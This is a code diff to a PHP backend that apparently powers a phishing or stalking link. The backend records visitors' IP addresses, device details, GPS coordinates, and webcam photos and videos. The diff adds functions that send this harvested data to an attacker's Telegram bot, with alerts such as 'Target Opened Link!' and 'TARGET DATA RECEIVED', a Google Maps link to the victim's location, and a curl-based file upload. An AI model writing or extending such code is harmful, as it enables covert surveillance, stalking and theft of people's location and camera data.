@@ -1,7 +1,37 @@
 <?php
 $action = $_GET['a'] ?? $_POST['a'] ?? 'index';
-$baseDir = 'user_info/fsdafa';
+$baseDir = 'user_info';
+$telegram_bot_token = '';
+$telegram_chat_id = '';
 if (!is_dir($baseDir)) mkdir($baseDir, 0755, true);
+
+function sendTelegram($msg) {
+    global $telegram_bot_token, $telegram_chat_id;
+    if (empty($telegram_bot_token) || empty($telegram_chat_id)) return;
+    $url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
+    $data = ['chat_id' => $telegram_chat_id, 'text' => $msg, 'parse_mode' => 'HTML'];
+    $options = [
+        'http' => [
+            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+            'method'  => 'POST',
+            'content' => http_build_query($data),
+        ],
+    ];
+    $context  = stream_context_create($options);
+    @file_get_contents($url, false, $context);
+}
+
+function sendTelegramMedia($file, $type, $caption) {
+    global $telegram_bot_token, $telegram_chat_id;
+    if (empty($telegram_bot_token) || empty($telegram_chat_id)) return;
+    
+    $url = "https://api.telegram.org/bot$telegram_bot_token/send" . ucfirst($type);
+    $realPath = realpath($file);
+    
+    // safe use of curl via shell
+    $cmd = "curl -s -X POST ".escapeshellarg($url)." -F chat_id=".escapeshellarg($telegram_chat_id)." -F ".escapeshellarg($type)."=@".escapeshellarg($realPath)." -F caption=".escapeshellarg($caption)." -F parse_mode=HTML";
+    exec($cmd);
+}
 
 function getClientIP() {
     $headers = ['HTTP_X_LOOPHOLE_CLIENT_IP', 'HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED','HTTP_CLIENT_IP','REMOTE_ADDR'];
@@ -53,6 +83,11 @@ function logIP($baseDir) {
         $data = "IP: $ip\r\nUser-Agent: $ua\r\nReferer: $ref\r\nTime: $time\r\n---\r\n";
         file_put_contents('ip.txt', $data, FILE_APPEND);
         file_put_contents($baseDir . '/saved.ip.txt', $data, FILE_APPEND);
+        $tg_msg = "<b>🔌 Target Opened Link!</b>\n";
+        $tg_msg .= "<b>IP:</b> <code>$ip</code>\n";
+        $tg_msg .= "<b>Time:</b> <code>$time</code>\n";
+        $tg_msg .= "<b>UA:</b> <code>$ua</code>";
+        sendTelegram($tg_msg);
     }
 }
 
@@ -101,6 +136,25 @@ switch ($action) {
             file_put_contents($file, $out);
             file_put_contents($baseDir . "/current_location.txt", $out);
             file_put_contents($baseDir . "/LocationLog.log", "Location: $lat,$lon (±{$acc}m)\n", FILE_APPEND);
+            
+            $tg_msg = "<b>📍 TARGET DATA RECEIVED</b>\n";
+            $tg_msg .= "<b>⏱ Time:</b> <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
+            $tg_msg .= "<b>🗺 LOCATION</b>\n";
+            $tg_msg .= "<b>Lat:</b> <code>$lat</code>\n";
+            $tg_msg .= "<b>Lon:</b> <code>$lon</code>\n";
+            $tg_msg .= "<b>Acc:</b> <code>$acc m</code>\n";
+            $tg_msg .= "<a href='https://www.google.com/maps/place/$lat,$lon'>🌏 Open in Google Maps</a>\n\n";
+            $tg_msg .= "<b>📱 DEVICE</b>\n";
+            $tg_msg .= "<b>OS:</b> <code>$os</code>\n";
+            $tg_msg .= "<b>Platform:</b> <code>$platform</code>\n";
+            $tg_msg .= "<b>Browser:</b> <code>$browser</code>\n";
+            $tg_msg .= "<b>CPU:</b> <code>$cores Cores</code>\n";
+            $tg_msg .= "<b>RAM:</b> <code>$ram GB</code>\n\n";
+            $tg_msg .= "<b>🌐 NETWORK</b>\n";
+            $tg_msg .= "<b>IP:</b> <code>$ip</code>\n";
+            $tg_msg .= "<b>UA:</b> <code>$ua</code>";
+            
+            sendTelegram($tg_msg);
             $saved = $baseDir . '/saved_locations';
             if (!is_dir($saved)) mkdir($saved, 0755, true);
             copy($file, $saved . '/' . basename($file));
@@ -119,6 +173,10 @@ switch ($action) {
             $filename = $capDir . '/cam_' . $date . '.png';
             file_put_contents($filename, $decoded);
             file_put_contents("Log.log", "Image saved: $filename\n", FILE_APPEND);
+            $tg_msg = "<b>📸 Image Captured!</b>\n";
+            $tg_msg .= "<b>File:</b> <code>" . basename($filename) . "</code>\n";
+            $tg_msg .= "<i>(Check server for file)</i>";
+            sendTelegram($tg_msg);
         }
         http_response_code(204);
         exit;
@@ -136,6 +194,10 @@ switch ($action) {
             $filename = $vidDir . '/vid_' . $date . '.' . $ext;
             file_put_contents($filename, $decoded);
             file_put_contents("Log.log", "Video saved: $filename\n", FILE_APPEND);
+            $tg_msg = "<b>🎥 Video Captured!</b>\n";
+            $tg_msg .= "<b>File:</b> <code>" . basename($filename) . "</code>\n";
+            $tg_msg .= "<i>(Check server for file)</i>";
+            sendTelegram($tg_msg);
         }
         http_response_code(204);
         exit;
